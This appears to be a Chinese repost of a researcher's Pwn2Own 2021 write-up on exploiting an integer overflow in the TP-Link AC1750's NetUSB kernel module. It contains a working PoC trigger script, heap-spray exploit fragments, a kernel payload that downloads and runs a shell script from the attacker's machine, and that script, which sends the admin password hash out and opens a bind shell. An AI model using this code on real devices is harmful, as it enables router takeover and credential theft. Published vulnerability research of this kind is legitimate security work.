#  TP-Link AC1750 漏洞挖掘的文章 （2022）- Pwn2Own 2021   
 Ots安全   2024-04-17 18:06  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
  
**目标选择**  
  
此时，@pwning_me、@chillbro4201和我都很积极，并且在不和谐的地方聊天。我们的最终目标是参加比赛，在查看了比赛规则后，阻力最小的路径似乎是针对路由器。我们对它们有更多的经验，硬件很容易获得，而且价格便宜，所以感觉这是正确的选择。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tacomtKLTx5O1eGcq6Bofzj4sM3YuhjpiaVBzOm0cfZuPiaEe4EZbEo5eeKHf3TytY07HRmZ72Ej6jBA/640?wx_fmt=png&from=appmsg "")  
  
至少，我们认为这是阻力最小的道路。参加比赛后，也许打印机至少同样软，但支付更高。但无论如何，我们不是为了钱，所以我们专注于路由器类别并坚持下去。  
  
在 5 款候选产品中，我们决定重点关注消费类设备，因为我们认为它们会更柔软。最重要的是，我对 TP-Link 有一点了解，而且小组中有人熟悉 NETGEAR 路由器。这就是我们选择的两个目标，然后我们就出发了：登录亚马逊并订购硬件以开始使用。那真是令人兴奋。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tacomtKLTx5O1eGcq6Bofzj44MSstO19OQhWGriaKOkh2kmEryqrV8IkQGh6WEoHrky6P1WDE4bgJKg/640?wx_fmt=png&from=appmsg "")  
  
TP-Link AC1750 智能 Wi-Fi 路由器到达了我的住处，我开始行动。但从哪里开始呢？那么，在这些情况下最好的办法就是在设备上获取 root shell。如何获得它并不重要，您只是希望人们能够找出值得关注的有趣攻击面。  
  
正如简介中提到的，在此之前的几个月里，在使用我自己的 TP-Link 路由器时，我发现了一个允许我执行 shell 命令的身份验证漏洞。尽管从攻击者的角度来看这毫无用处，但在设备上获取 shell 并引导研究将很有用。不幸的是，目标并不容易受到攻击，所以我需要寻找另一种方法。  
  
哦也。有趣的事实：我实际上最初订购了错误的路由器。事实证明，TP-Link 销售两种看起来非常相似的产品线：A7和C7。我买了前者，但需要后者来参加比赛，哎呀🤦🏽‍♂️。特别感谢科迪让我知道😅！  
  
**在目标上获取 shell**  
  
经过几天对 Web 服务器的逆向工程，寻找容易实现的目标但没有找到任何结果，我意识到我需要找到另一种方法来在设备上获取 shell。  
  
谷歌了一下，我发现了一篇我的同胞写的文章：Pwn2own Tokyo 2020: Defeating the TP-Link AC1750 by @0xMitsurugi and @swapg。这篇文章描述了他们如何在 2020 年入侵 Pwn2Own 东京的路由器，还描述了他们如何在设备上安装 shell，太棒了 🙏🏽。问题是我真的没有任何硬件经验。没有任何。  
  
但幸运的是，我有很酷的朋友。我联系了我的儿子@bsmtiam，他建议订购一根FT232 USB 电缆，所以我就这么做了。不久后我收到了硬件并顺路拜访了他的住处。他拆开路由器，把它放在长凳上，然后开始工作。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48tacomtKLTx5O1eGcq6Bofzj4IvbyjekYdv6CbtialLK5qN3oSYylD97zY6wcibniaVic0srkZUs9tnsN3Q/640?wx_fmt=jpeg&from=appmsg "")  
  
经过几次尝试，他成功焊接了UART。我们将 FT232 USB 电缆连接到路由器板上并将其插入我的笔记本电脑：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/rWGOWg48tacomtKLTx5O1eGcq6Bofzj4kq5Sq7Jx1qbWg0OnUNI00LK7DHZicS8p2Kd1FVsaSg6I3LaaU8A8RWw/640?wx_fmt=jpeg&from=appmsg "")  
  
使用 Python 和minicom库，我们终于能够进入交互式 root shell 💥：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rWGOWg48tacomtKLTx5O1eGcq6Bofzj49t0sIHb4SeNjUgoPv5F083JjfD7CL3pYw4T0GoI4geUMMdWibV08sNA/640?wx_fmt=gif&from=appmsg "")  
  
惊人的。为了庆祝这个小小的胜利，我们去当地的酒吧买了一个汉堡和一杯啤酒🍻。美好的一天，这一天。  
  
  
**枚举攻击面**  
  
是时候让我弄清楚我应该把时间集中在哪些领域了。我读了很多书，因为多年来该路由器已多次成为 Pwn2Own 的攻击目标。我认为尝试开辟新的领域来降低重复参加比赛的机会并最大限度地增加我找到能让我参加比赛的东西的机会可能是一件好事。在考虑重复之前，我需要一个错误。  
  
我开始做一些非常基本的攻击面枚举：正在运行的进程、iptable 规则、套接字侦听、crontable 等。没什么花哨的。  
```
# ./busybox-mips netstat -platue
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:33344           0.0.0.0:*               LISTEN      -
tcp        0      0 localhost:20002         0.0.0.0:*               LISTEN      4877/tmpServer
tcp        0      0 0.0.0.0:20005           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:www             0.0.0.0:*               LISTEN      4940/uhttpd
tcp        0      0 0.0.0.0:domain          0.0.0.0:*               LISTEN      4377/dnsmasq
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      5075/dropbear
tcp        0      0 0.0.0.0:https           0.0.0.0:*               LISTEN      4940/uhttpd
tcp        0      0 :::domain               :::*                    LISTEN      4377/dnsmasq
tcp        0      0 :::ssh                  :::*                    LISTEN      5075/dropbear
udp        0      0 0.0.0.0:20002           0.0.0.0:*                           4878/tdpServer
udp        0      0 0.0.0.0:domain          0.0.0.0:*                           4377/dnsmasq
udp        0      0 0.0.0.0:bootps          0.0.0.0:*                           4377/dnsmasq
udp        0      0 0.0.0.0:54480           0.0.0.0:*                           -
udp        0      0 0.0.0.0:42998           0.0.0.0:*                           5883/conn-indicator
udp        0      0 :::domain               :::*                                4377/dnsmasq
```  
  
乍一看，以下进程看起来很有趣： - HTTP 服务器， -可能无法修补上游错误的uhttpd第三方服务（不太可能？）， - 2021 年弹出的，是被利用漏洞的载体在。dnsmasqtdpServersync-server  
  
**追鬼**  
  
因为我熟悉uhttpdHTTP 服务器在我的家庭路由器上的工作方式，所以我想我至少会花几天时间查看目标路由器上运行的服务器。 HTTP 服务器能够运行和调用 Lua 扩展，这就是我认为可能存在错误的地方：命令注入等。但有趣的是，所有现有的公共 Lua 工具都无法分析这些扩展，这既令人沮丧又令人困惑。长话短说，路由器上使用的 Lua 运行时似乎已被修改，导致操作码表出现混乱。结果，编译的扩展将破坏所有公共工具，因为操作码不匹配。愚蠢的。我最终设法反编译了其中一些扩展并发现了一个错误，但从攻击者的角度来看它可能毫无用处。是时候继续前进了，因为我觉得没有足够的潜力在那里找到有趣的东西。  
  
我花费时间的另一件事是浏览 TP-Link 为该路由器发布的 GPL 代码存档：ArcherC7V5.tar.bz2。由于许可的原因，TP-Link 必须（？）“维护”包含他们在设备上使用的 GPL 代码的存档。我认为这可能是确定dnsmasq过去几年发布的最新漏洞是否得到正确修补的好方法。看起来有些漏洞没有被修补，但反汇编显示不同😔。死路。  
  
**NetUSB恶作剧**  
  
上面的输出中有两行netstat对我来说确实很突出：  
```
tcp        0      0 0.0.0.0:33344           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:20005           0.0.0.0:*               LISTEN      -
```  
  
为什么没有与这些套接字关联的进程名称呃🤔？好吧，事实证明，在谷歌搜索并环顾四周之后，这些套接字是由......等等......内核模块打开的。这对我来说听起来很疯狂，这也是我第一次看到这一点。不过有点令人兴奋。  
  
这个NetUSB.ko内核模块实际上是KCodes公司编写的一个软件，用于实现USB over IP。另一个疯狂的事情是我记得在我的 NETGEAR 路由器上看到过这个相同的模块。诡异的。经过谷歌搜索后，我们发现过去发现和利用了多个漏洞，而且 TP-Link 确实不是唯一提供该模块的路由器，这并不奇怪。  
  
虽然我认为我不太可能在那里找到一些有趣的东西，但我仍然投入了时间去研究它并感受它。经过几天的静态逆向工程，它看起来确实比我最初想象的要复杂得多，所以我决定坚持更长时间。  
  
经过一段时间的研究后，事情开始变得有意义：我对一些重要的结构进行了逆向工程，并且能够更深入地跟踪代码中不受信任的输入。在枚举了攻击者输入被解析和使用的很多地方之后，我发现了一个可以在输入分配函数的算术中溢出整数的地方：  
```
void *SoftwareBus_dispatchNormalEPMsgOut(SbusConnection_t *SbusConnection, char HostCommand, char Opcode)
{
  // ...
  result = (void *)SoftwareBus_fillBuf(SbusConnection, v64, 4);
  if(result) {
    v64[0] = _bswapw(v64[0]); <----------------------- attacker controlled
    Payload_1 = mallocPageBuf(v64[0] + 9, 0xD0); <---- overflow
    if(Payload_1) {
      // ...
      if(SoftwareBus_fillBuf(SbusConnection, Payload_1 + 2, v64[0]))
```  
  
我首先认为这会导致严重溢出类型的错误，因为代码会尝试将大量字节读取到该缓冲区中，但我仍然继续制作了一个 PoC。那时我才意识到我错了。仔细一看，该SoftwareBus_fillBuf函数实际上定义如下：  
```
int SoftwareBus_fillBuf(SbusConnection_t *SbusConnection, void *Buffer, int BufferLen) {
  if(SbusConnection)
    if(Buffer) {
      if(BufferLen) {
        while (1) {
          GetLen = KTCP_get(SbusConnection, SbusConnection->ClientSocket, Buffer, BufferLen);
          if ( GetLen <= 0 )
            break;
          BufferLen -= GetLen;
          Buffer = (char *)Buffer + GetLen;
          if ( !BufferLen )
            return 1;
        }
        kc_printf("INFO%04X: _fillBuf(): len = %d\n", 1275, GetLen);
        return 0;
      }
      else {
        return 1;
      }
    } else {
      // ...
      return 0;
    }
  }
  else {
    // ...
    return 0;
  }
}
```  
  
KTCP_get基本上是 的包装器ks_recv，这基本上意味着攻击者可以强制函数返回而不读取全部BufferLen字节数。这意味着我可以强制分配一个小缓冲区并用我想要的尽可能多的数据溢出它。如果您有兴趣首先了解如何触发此代码路径，请检查zenith-poc.py中的握手工作原理，或者您也可以阅读CVE-2021-45608 |来自 @maxpl0it 的数百万最终用户路由器中的 NetUSB RCE 缺陷。以下代码可以触发上述漏洞：  
```
from Crypto.Cipher import AES
import socket
import struct
import argparse

le8 = lambda i: struct.pack('=B', i)
le32 = lambda i: struct.pack('<I', i)

netusb_port = 20005

def send_handshake(s, aes_ctx):
  # Version
  s.send(b'\x56\x04')
  # Send random data
  s.send(aes_ctx.encrypt(b'a' * 16))
  _ = s.recv(16)
  # Receive & send back the random numbers.
  challenge = s.recv(16)
  s.send(aes_ctx.encrypt(challenge))

def send_bus_name(s, name):
  length = len(name)
  assert length - 1 < 63
  s.send(le32(length))
  b = name
  if type(name) == str:
    b = bytes(name, 'ascii')
  s.send(b)

def create_connection(target, port, name):
  second_aes_k = bytes.fromhex('5c130b59d26242649ed488382d5eaecc')
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((target, port))
  aes_ctx = AES.new(second_aes_k, AES.MODE_ECB)
  send_handshake(s, aes_ctx)
  send_bus_name(s, name)
  return s, aes_ctx

def main():
  parser = argparse.ArgumentParser('Zenith PoC2')
  parser.add_argument('--target', required = True)
  args = parser.parse_args()
  s, _ = create_connection(args.target, netusb_port, 'PoC2')
  s.send(le8(0xff))
  s.send(le8(0x21))
  s.send(le32(0xff_ff_ff_ff))
  p = b'\xab' * (0x1_000 * 100)
  s.send(p)
```  
  
另一个有趣的细节是mallocPageBuf我不知道分配函数。在研究了它的实现之后，它最终调用了_get_free_pagesLinux 内核的一部分。_get_free_pages分配 2**n 个页面，并使用所谓的二进制好友分配器来实现。我不熟悉那种分配器，但最终对它有点着迷。如果您想了解更多信息，可以阅读第 6 章：物理页面分配。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tacomtKLTx5O1eGcq6Bofzj49miccP3ZhyVwMagY7aVFgJtIIEpdVq8LrDicoEuo73DhVQYzsP8oMUjA/640?wx_fmt=png&from=appmsg "")  
  
哇，好吧，也许我可以用这个错误做一些有用的事情。可能性仍然很大，但根据我的理解，该错误将使我能够完全控制内容，并且我能够用几乎与我想要的一样多的数据溢出页面。我唯一无法完全控制的是传递给分配的大小。唯一的限制是我只能触发mallocPageBuf大小在以下间隔内的调用：[0, 8]因为整数溢出。mallocPageBuf将传递的大小与 2 的下一个幂对齐，并计算order(n in 2**n) 来调用_get_free_pages。  
  
对我来说另一个好处是内核没有 KASLR，而且我还注意到即使遇到访问冲突或其他问题，内核也会尽力保持运行。它不会在路上第一次出现故障时崩溃并重新启动，而是尝试运行，直到无法运行为止。甜的。  
  
我最终还发现该驱动程序正在通过网络泄漏内核地址。在上面的代码片段中，kc_printf使用诊断/调试字符串调用。查看其代码，我意识到字符串实际上是通过网络在不同的端口上发送的。我认为这对于同步和泄漏驱动程序所做的一些分配也很有帮助。  
```
int kc_printf(const char *a1, ...) {
  // ...
  v1 = vsprintf(v6, a1);
  v2 = v1 < 257;
  v3 = v1 + 1;
  if(!v2) {
    v6[256] = 0;
    v3 = 257;
  }
  v5 = v3;
  kc_dbgD_send(&v5, v3 + 4); // <-- send over socket
  return printk("<1>%s", v6);
}
```  
  
很有趣吧？  
  
**在 QEMU 中启动 NetUSB**  
  
尽管我的设备上有 root shell，但我无法调试内核或驱动程序的代码。这使得人们很难考虑利用这个漏洞。最重要的是，我是一个彻头彻尾的 Linux 菜鸟，所以缺乏自省是行不通的。我有什么选择？  
  
嗯，正如我之前提到的，TP-Link 正在维护一个 GPL 档案，其中包含有关他们使用的 Linux 版本、他们应用的补丁以及构建内核所需的一切信息。我认为他们非常好，这应该给我一个很好的起点，让我能够在 QEMU 下调试这个驱动程序。我知道这不会为我提供最精确的模拟环境，但同时，这对我目前的情况来说将是一个巨大的改善。我将能够连接 GDB，检查分配器状态，并希望取得进展。  
  
事实证明这比我想象的要困难得多。我首先尝试通过 GPL 存档构建内核。从外观上看，一切都在那里，一个简单的制作就应该可以工作。但这并没有解决问题。我花了几周的时间才真正编译它（正确的依赖关系，到处修补位，......），但我最终做到了。我不得不尝试一堆工具链版本，修复会导致我的 Linux 发行版出现错误的随机文件，等等。说实话，我几乎忘记了这里的所有细节，但我记得这很痛苦。如果您有兴趣，我已经压缩了该虚拟机的文件系统，您可以在这里找到它：wheezy-openwrt-ath.tar.xz。  
  
我以为这就是我痛苦的结束，但事实并非如此。完全没有。构建的内核不会在 QEMU 中启动，并且会在启动时挂起。我试图了解发生了什么，但它看起来与模拟硬件有关，老实说我超出了我的能力范围。我决定从不同的角度来看待这个问题。相反，我从aurel32 的网站下载了一个Linux MIPS QEMU 映像，该映像启动得很好，并决定尝试合并两个内核配置，直到最终得到一个配置与内核尽可能接近的可启动映像。在设备上运行。相同的内核版本、分配器、相同的驱动程序等。至少足够相似以能够加载驱动程序。NetUSB.ko  
  
再说一遍，因为我是一个彻头彻尾的 Linux 菜鸟，所以我没能真正看到其中的复杂性。因此，我开始了这段旅程，我必须轻松编译 100 多个内核，直到能够  
NetUSB.ko  
在 QEMU 中加载和执行驱动程序。我没有看到的主要挑战是在 Linux 领域，配置标志可以改变内部结构的大小。这意味着，如果您尝试在内核 B 上运行驱动程序 A，则驱动程序 A 可能会错误地认为结构的大小为 C，而实际上该结构的大小为 D。这正是发生的情况。在这个 QEMU 映像中启动驱动程序会导致大量随机崩溃，我一开始无法真正解释这些崩溃。因此，我跟踪了多个兔子洞，直到意识到我的内核配置与驱动程序的预期不一致。例如，下面定义的net_device显示其定义根据内核配置选项打开或关闭而变化：  
CONFIG_WIRELESS_EXT  
、CONFIG_VLAN_8021Q  
、CONFIG_NET_DSA  
、CONFIG_SYSFS  
、CONFIG_RPS  
、CONFIG_RFS_ACCEL等。但这还不是全部。该结构使用的任何类型都可以执行相同的操作，这意味着仅查看结构的主要定义是不够的。  
```
struct net_device {
// ...
#ifdef CONFIG_WIRELESS_EXT
  /* List of functions to handle Wireless Extensions (instead of ioctl).
   * See <net/iw_handler.h> for details. Jean II */
  const struct iw_handler_def * wireless_handlers;
  /* Instance data managed by the core of Wireless Extensions. */
  struct iw_public_data * wireless_data;
#endif
// ...
#if IS_ENABLED(CONFIG_VLAN_8021Q)
  struct vlan_info __rcu  *vlan_info; /* VLAN info */
#endif
#if IS_ENABLED(CONFIG_NET_DSA)
  struct dsa_switch_tree  *dsa_ptr; /* dsa specific data */
#endif
// ...
#ifdef CONFIG_SYSFS
  struct kset   *queues_kset;
#endif

#ifdef CONFIG_RPS
  struct netdev_rx_queue  *_rx;

  /* Number of RX queues allocated at register_netdev() time */
  unsigned int    num_rx_queues;

  /* Number of RX queues currently active in device */
  unsigned int    real_num_rx_queues;

#ifdef CONFIG_RFS_ACCEL
  /* CPU reverse-mapping for RX completion interrupts, indexed
   * by RX queue number.  Assigned by driver.  This must only be
   * set if the ndo_rx_flow_steer operation is defined. */
  struct cpu_rmap   *rx_cpu_rmap;
#endif
#endif
//...
};
```  
  
一旦我弄清楚了这一点，我就经历了一个相当漫长的尝试和错误的过程。我将启动驱动程序，获取有关崩溃的信息，并尝试查看所涉及的代码/结构，看看内核配置选项是否会影响相关结构的布局。从那里，我可以看到可启动 QEMU 映像的内核配置与我从 GPL 构建的内核之间的差异，并查看哪里不匹配。如果有的话，我可以简单地打开或关闭该选项，重新编译并希望它不会使内核在 QEMU 下无法启动。  
  
make ARCH=mips经过至少 136 次编译（我在其中一个😅 中找到的次数  
.bash_history）和巨大的挫折之后，我最终构建了一个能够运行  
NetUSB.ko  
😲 的 Linux 内核版本：  
```
over@panther:~/pwn2own$ qemu-system-mips -m 128M -nographic -append "root=/dev/sda1 mem=128M" -kernel linux338.vmlinux.elf -M malta -cpu 74Kf -s -hda debian_wheezy_mips_standard.qcow2 -net nic,netdev=network0 -netdev user,id=network0,hostfwd=tcp:127.0.0.1:20005-10.0.2.15:20005,hostfwd=tcp:127.0.0.1:33344-10.0.2.15:33344,hostfwd=tcp:127.0.0.1:31337-10.0.2.15:31337
[...]
root@debian-mips:~# ./start.sh
[   89.092000] new slab @ 86964000
[   89.108000] kcg 333 :GPL NetUSB up!
[   89.240000] NetUSB: module license 'Proprietary' taints kernel.
[   89.240000] Disabling lock debugging due to kernel taint
[   89.268000] kc   90 : run_telnetDBGDServer start
[   89.272000] kc  227 : init_DebugD end
[   89.272000] INFO17F8: NetUSB 1.02.69, 00030308 : Jun 11 2015 18:15:00
[   89.272000] INFO17FA: 7437: Archer C7    :Archer C7
[   89.272000] INFO17FB:  AUTH ISOC
[   89.272000] INFO17FC:  filterAudio
[   89.272000] usbcore: registered new interface driver KC NetUSB General Driver
[   89.276000] INFO0145:  init proc : PAGE_SIZE 4096
[   89.280000] INFO16EC:  infomap 869c6e38
[   89.280000] INFO16EF:  sleep to wait eth0 to wake up
[   89.280000] INFO15BF: tcpConnector() started... : eth0
NetUSB 160207 0 - Live 0x869c0000 (P)
GPL_NetUSB 3409 1 NetUSB, Live 0x8694f000
root@debian-mips:~# [   92.308000] INFO1572: Bind to eth0
```  
  
对于想要做同样事情的读者，这里有一些他们可能会觉得有用的技术细节（我可能忘记了大多数其他的）： - 我曾经debootstrap能够轻松地安装较旧的 Linux 发行版，直到有人可以很好地使用软件包我使用 Debian Wheezy (7.11) 发行版从 TP-Link 构建 GPL 代码并交叉编译内核。我上传了这两个系统的档案：wheezy-openwrt-ath.tar.xz和wheezy-compile-kernel.tar.xz。您应该能够在常规 Ubuntu Intel x64 VM 和  
chroot这些文件夹中提取这些内容，并且应该能够重现我所描述的内容。或者至少，距离繁殖非常近。 - 我使用以下工具链交叉编译了内核：(toolchain-mips_r2_gcc-4.6-linaro_uClibc-0.9.33.2  
) gcc (Linaro GCC 4.6-2012.02) 4.6.3 20120201 (prerelease))。我使用以下命令来编译内核：  
$ make ARCH=mips CROSS_COMPILE=/home/toolchain-mips_r2_gcc-4.6-linaro_uClibc-0.9.33.2/bin/mips-openwrt-linux- -j8 vmlinux  
。您可以在wheezy-openwrt-ath.tar.xz中找到从 GPL 代码下载/编译的工具链，或者您可以直接从wheezy-compile-kernel.tar.xz获取二进制文件。 - 你可以在start_qemu.sh和dbg.sh中找到我用来启动QEMU的命令行，以将GDB附加到内核。  
  
**进入真力时**  
  
一旦我能够将 GDB 连接到内核，我终于拥有了一个可以根据需要进行反思的环境。请注意，由于我对内核配置进行了所有修改，我真的不知道是否可以将漏洞利用到真实目标。但当时我也没有利用过，所以我想如果我到达那里的话，这将是另一个需要解决的问题。  
  
我开始阅读大量有关 Linux 内核开发的代码、文档和论文。 Linux 内核版本已经足够老了，没有一系列更新的缓解措施。这给了我一些希望。我花了相当多的时间试图利用上面的溢出。在通过数据包套接字利用 Linux 内核中， Andrey Konovalov详细描述了一种看起来可以解决我发现的错误的攻击。另外，请阅读这篇文章，因为它写得很好而且很有趣。总体思路是 kmalloc 在内部使用伙伴分配器从内核中获取页面，因此，我们可以将可以溢出的伙伴页面放置在用于存储 kmalloc 板的页面之前。如果我没记错的话，我的策略是耗尽 0 阶自由列表（0x1000 字节的内存块），这将强制分解来自更高阶的块以提供自由列表。我想象 1 号自由列表中的一个块可以被分成 2 个 0x1000 块，这意味着我可以得到一个与另一个 0x1000 块相邻的 0x1000 块，现在可以由 kmalloc-1024 板使用。我努力奋斗，尝试了很多事情，但从未成功。我记得这个 bug 有一些我在发现它时没有意识到的烦人的事情，但我确信更有经验的 Linux 内核黑客可以为这个 bug 编写一个漏洞利用程序。  
  
我想，哦，好吧。也许有更好的东西。也许我应该专注于寻找类似的错误，但在 kmalloc'd 区域中，因为我不必处理与上述相同的问题。不过，我仍然需要担心能否将缓冲区放置在多汁的腐败目标附近。环顾了一段时间后，我发现了另一个整数溢出：  
```
void *SoftwareBus_dispatchNormalEPMsgOut(SbusConnection_t *SbusConnection, char HostCommand, char Opcode)
{
  // ...
  switch (OpcodeMasked) {
    case 0x50:
        if (SoftwareBus_fillBuf(SbusConnection, ReceiveBuffer, 4)) {
          ReceivedSize = _bswapw(*(uint32_t*)ReceiveBuffer);
            AllocatedBuffer = _kmalloc(ReceivedSize + 17, 208);
            if (!AllocatedBuffer) {
                return kc_printf("INFO%04X: Out of memory in USBSoftwareBus", 4296);
            }
  // ...
            if (!SoftwareBus_fillBuf(SbusConnection, AllocatedBuffer + 16, ReceivedSize))
```  
  
凉爽的。但此时，我有点力不从心了。我能够溢出 kmalloc-128，但并不真正知道我可以通过网络将什么类型的有用对象放在那里。经过一系列试验和错误后，我开始注意到，如果我在分配缓冲区之后但在溢出之前稍作停顿，就会神奇地在离我的缓冲区相当近的地方分配一个有趣的结构。直到今天，我还没有完全调试它到底来自哪里，但因为这是我唯一的线索，所以我同意了。  
  
目标内核没有 ASLR，也没有 NX，所以我的漏洞利用能够硬编码地址并直接执行堆，这很好。我还可以使用我之前逆向工程的各种分配函数将任意数据放入堆中。例如，触发 3MB 大分配总是返回一个固定地址，我可以在其中暂存内容。为了获得这个地址，我只是修补了驱动程序二进制文件，以便在分配后在真实设备上输出地址，因为我无法调试它。  
```
# (gdb) x/10dwx 0xffffffff8522a000
# 0x8522a000:     0xff510000      0x1000ffff      0xffff4433      0x22110000
# 0x8522a010:     0x0000000d      0x0000000d      0x0000000d      0x0000000d
# 0x8522a020:     0x0000000d      0x0000000d
addr_payload = 0x83c00000 + 0x10

# ...

def main(stdscr):
  # ...
  # Let's get to business.
  _3mb = 3 * 1_024 * 1_024
  payload_sprayer = SprayerThread(args.target, 'payload sprayer')
  payload_sprayer.set_length(_3mb)
  payload_sprayer.set_spray_content(payload)
  payload_sprayer.start()
  leaker.wait_for_one()
  sprayers.append(payload_sprayer)
  log(f'Payload placed @ {hex(addr_payload)}')
  y += 1
```  
  
我的最后一个漏洞利用Zenith溢出了由 Linux 内核的套接字堆栈放置的相邻  
wait_queue_head_t.head.next结构，该结构具有在我的控制下制作的地址  
wait_queue_entry_t （  
Trasher漏洞利用代码中的类）。这是结构体的定义：  
```
struct wait_queue_head {
  spinlock_t    lock;
  struct list_head  head;
};

struct wait_queue_entry {
  unsigned int    flags;
  void      *private;
  wait_queue_func_t func;
  struct list_head  entry;
};
```  
  
这个结构有一个函数指针，  
func我用它来劫持执行并将流程重定向到一个固定位置，在一个大的内核堆块中，我之前在其中暂存了有效负载（  
0x83c00000在漏洞利用代码中）。调用函数指针的函数  
func是  
__wake_up_common，您可以在下面看到它的代码：  
```
static void __wake_up_common(wait_queue_head_t *q, unsigned int mode,
      int nr_exclusive, int wake_flags, void *key)
{
  wait_queue_t *curr, *next;

  list_for_each_entry_safe(curr, next, &q->task_list, task_list) {
    unsigned flags = curr->flags;

    if (curr->func(curr, mode, wake_flags, key) &&
        (flags & WQ_FLAG_EXCLUSIVE) && !--nr_exclusive)
      break;
  }
}
```  
  
q->head.next/prev  
 这就是 GDB损坏后的样子：  
```
(gdb) break *__wake_up_common+0x30 if ($v0 & 0xffffff00) == 0xdeadbe00

(gdb) break sock_recvmsg if msg->msg_iov[0].iov_len == 0xffffffff

(gdb) c
Continuing.
sock_recvmsg(dst=0xffffffff85173390)

Breakpoint 2, __wake_up_common (q=0x85173480, mode=1, nr_exclusive=1, wake_flags=1, key=0xc1)
    at kernel/sched/core.c:3375
3375    kernel/sched/core.c: No such file or directory.

(gdb) p *q
$1 = {lock = {{rlock = {raw_lock = {<No data fields>}}}}, task_list = {next = 0xdeadbee1,
    prev = 0xbaadc0d1}}

(gdb) bt
#0  __wake_up_common (q=0x85173480, mode=1, nr_exclusive=1, wake_flags=1, key=0xc1)
    at kernel/sched/core.c:3375
#1  0x80141ea8 in __wake_up_sync_key (q=<optimized out>, mode=<optimized out>,
    nr_exclusive=<optimized out>, key=<optimized out>) at kernel/sched/core.c:3450
#2  0x8045d2d4 in tcp_prequeue (skb=0x87eb4e40, sk=0x851e5f80) at include/net/tcp.h:964
#3  tcp_v4_rcv (skb=0x87eb4e40) at net/ipv4/tcp_ipv4.c:1736
#4  0x8043ae14 in ip_local_deliver_finish (skb=0x87eb4e40) at net/ipv4/ip_input.c:226
#5  0x8040d640 in __netif_receive_skb (skb=0x87eb4e40) at net/core/dev.c:3341
#6  0x803c50c8 in pcnet32_rx_entry (entry=<optimized out>, rxp=0xa0c04060, lp=0x87d08c00,
    dev=0x87d08800) at drivers/net/ethernet/amd/pcnet32.c:1199
#7  pcnet32_rx (budget=16, dev=0x87d08800) at drivers/net/ethernet/amd/pcnet32.c:1212
#8  pcnet32_poll (napi=0x87d08c5c, budget=16) at drivers/net/ethernet/amd/pcnet32.c:1324
#9  0x8040dab0 in net_rx_action (h=<optimized out>) at net/core/dev.c:3944
#10 0x801244ec in __do_softirq () at kernel/softirq.c:244
#11 0x80124708 in do_softirq () at kernel/softirq.c:293
#12 do_softirq () at kernel/softirq.c:280
#13 0x80124948 in invoke_softirq () at kernel/softirq.c:337
#14 irq_exit () at kernel/softirq.c:356
#15 0x8010198c in ret_from_exception () at arch/mips/kernel/entry.S:34
```  
  
一旦func调用指针，我就可以控制执行流，并执行一个简单的内核有效负载，该负载利用call_usermodehelper_setup  
/call_usermodehelper_exec以 root 身份执行用户模式命令。它从攻击者机器上的侦听 HTTP 服务器上提取 shell 脚本并执行它。  
```
arg0: .asciiz "/bin/sh"
arg1: .asciiz "-c"
arg2: .asciiz "wget http://{ip_local}:8000/pwn.sh && chmod +x pwn.sh && ./pwn.sh"
argv: .word arg0
      .word arg1
      .word arg2
envp: .word 0
```  
  
pwn.sh shell 脚本只是泄露了的哈希值，并打开一个bindshell（为Thomas Chauchefoin和Kevin Denis的 Lua oneliner欢呼） ，攻击者可以连接到（如果内核还没有崩溃😳）：admin  
shadow  
```
#!/bin/sh
export LPORT=31337
wget http://{ip_local}:8000/pwd?$(grep -E admin: /etc/shadow)
lua -e 'local k=require("socket");
  local s=assert(k.bind("*",os.getenv("LPORT")));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));c:send(b);
  end;c:close();f:close();'
```  
  
该漏洞利用还使用了我之前提到的调试接口，因为它会泄漏内核模式指针，并且对于基本同步总体上很有用（参见该类Leaker）。  
  
好吧，到那时，它就可以在 QEMU 中运行了……这非常疯狂。从来没想过会这样。曾经。同样疯狂的是，我仍然及时进行 Pwn2Own 注册，所以也许这也是可能的🤔。就可靠性而言，它在 QEMU 环境中运行得足够好：我想说大约是 3 倍大约 5 倍。够好了。  
  
我开始将该漏洞移植到真实设备上，令我惊讶的是它也能在真实设备上运行。可靠性较差，但令我印象深刻的是它仍然有效。疯狂的。尤其是硬件和内核都不同！由于我仍然无法调试目标的内核，因此我留下了dmesg输出来尝试使事情变得更好。到处调整喷雾，尝试更快或更慢；试图找到一个神奇的组合。最终我并没有发现什么神奇之处；该漏洞利用并不可靠，但嘿，我只需要它在舞台上着陆一次即可。这就是星星对齐时的样子💥：  
  
  
  
美丽的。是时候注册了！  
  
  
**参加比赛**  
  
由于受新冠肺炎 (COVID-19) 影响，比赛完全远程进行（真糟糕！），参赛者需要在比赛前提供漏洞利用和文档。完全远程意味着 ZDI 的人员会将我们的漏洞利用到他们设置的环境中。  
  
那时我们有两个漏洞，这就是我们注册的目的。在收到 ZDI 的确认后，我注意到 TP-Link 推送了路由器的更新😳。我想该死。当我看到这个消息时，我正在工作，并为 bug 被杀死而感到压力。或者担心更新可能会改变我的漏洞利用所依赖的任何内容：内核等。我结束了一天的工作，从网站上下载了固件。我在下载存档时检查了发行说明，但没有任何提示表明他们已经更新了 NetUSB 或内核，这很好。我从固件文件中提取了该文件binwalk并快速验证了该NetUSB.ko文件。我抓起一个哈希......它是一样的。哇。多么轻松啊😮‍💨。  
  
当展示我的漏洞的时候到了，不幸的是，它在三次尝试中都没有成功，这有点令人沮丧。虽然这很令人沮丧，但我从一开始就知道我参加比赛的几率不是最好的。我记得我最初根本不认为自己能够参加比赛，所以我把这次经历视为自己的胜利。  
  
